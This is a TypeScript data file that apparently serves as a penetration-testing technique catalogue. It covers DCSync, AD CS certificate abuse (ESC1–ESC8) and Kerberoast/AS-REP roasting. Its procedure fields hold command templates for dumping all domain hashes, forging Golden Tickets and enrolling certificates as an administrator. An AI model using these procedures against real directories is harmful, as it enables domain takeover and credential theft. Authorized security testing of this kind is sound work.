/** Identity-AD techniques (late). */
import type { TechniqueEntry } from "./types.ts";

export const IDENTITY_AD_TECHNIQUES_LATE: readonly TechniqueEntry[] = [
	{
		id: "ad-dcsync",
		name: "DCSync (DS-Replication-Get-Changes privilege abuse)",
		domain: "identity-ad",
		mitre: ["T1003.006"],
		cwe: ["CWE-522", "CWE-285"],
		triggers:
			"Compromised account has Replicating Directory Changes (DCSync) rights — Domain Admins, or mis-granted via ACL (BloodHound edge `GetChanges`).",
		procedure: [
			"Confirm rights via BloodHound: path `User -> GetChanges/GetChangesAll -> Domain`.",
			"Run `secretsdump.py <dom>/<user>:<pass>@<dc>` — impersonates a DC, pulls all NTLM/Kerberos hashes.",
			"Use hashes: Pass-the-Hash (`nxc smb -H <hash>`), forge tickets, or AS-REP from the krbtgt (Golden Ticket).",
		],
		proofExit:
			"Full domain hashdump extracted (krbtgt + all users) AND a forged Golden Ticket / PtH access validated against a live service.",
		pitfalls: [
			"Needs both `GetChanges` AND `GetChangesAll` (and `GetChangesInFilteredSet` for RODC).",
			"High-noise on DC; event 4662 — use sparingly in engagements with logging.",
		],
		tools: ["impacket-secretsdump", "bloodhound-python", "nxc"],
	},
	{
		id: "ad-cs-esc",
		name: "AD CS misconfiguration (ESC1–ESC8)",
		domain: "identity-ad",
		mitre: ["T1550.001", "T1210"],
		cwe: ["CWE-285", "CWE-732"],
		triggers:
			"Active Directory Certificate Services; templates with low-priv enroll, subjectAltName allowed (ESC1), or web enrollment HTTP endpoints (ESC8).",
		procedure: [
			"Enumerate with `certipy find` / `Certify` — map templates, enrollment rights, EKUs, SAN allowance, manager approval/issuance requirements.",
			"ESC1: low-priv can enroll, SAN allowed, no approval → `certipy req -ca <ca> -template <tpl> -upn administrator@dom` → cert as anyone.",
			"ESC4: writable template → edit it to ESC1-equivalent, request, revert.",
			"ESC8: NTLM-relay the HTTP enrollment endpoint → enroll as the relayed victim.",
			"Use cert: `certipy auth -pfx user.pfx` → get TGT/PtT; or Schannel to LDAP for RBCD/DCSync escalation.",
		],
		proofExit:
			"Certificate issued as a privileged victim + authenticated as that principal (TGT/PTT captured) → escalated access validated.",
		pitfalls: [
			"ESC class depends on exact template flags — read ESC criteria precisely; not every low-priv template is exploitable.",
			"Web enrollment (ESC8) needs SMB→HTTP relay feasibility (signing, channel binding).",
		],
		tools: ["certipy", "bloodhound-python", "nxc", "python3"],
	},
	{
		id: "identity-kerberoast-asrep",
		name: "Kerberoast / AS-REP roast credential harvest map",
		domain: "identity-ad",
		mitre: ["T1558", "T1558.003", "T1558.004"],
		cwe: ["CWE-522"],
		triggers:
			"Domain-joined lab or authorized AD assessment; SPNs on user accounts or DONT_REQ_PREAUTH principals present.",
		procedure: [
			"Enumerate users/SPNs: `GetUserSPNs.py domain/user:pass -dc-ip DC` or ldapsearch for servicePrincipalName.",
			"Request TGS for roastable SPNs; save hashes in $krb5tgs$23$ format.",
			"AS-REP roast: identify DONT_REQ_PREAUTH; `GetNPUsers.py` without preauth.",
			"Crack offline with hashcat -m 13100/18200; do not spray production without authorization.",
			"Document principal, SPN, etype, and crack result as evidence; prefer read-only first.",
		],
		proofExit:
			"At least one valid TGS/AS-REP hash captured with principal metadata; optional cracked cleartext only in authorized lab with proof hash match.",
		pitfalls: [
			"AES vs RC4 etype differences change hashcat modes.",
			"Roasting high-value accounts can generate SOC alerts — stay in scope.",
		],
		tools: ["impacket", "hashcat", "ldapsearch", "python3"],
	},
];
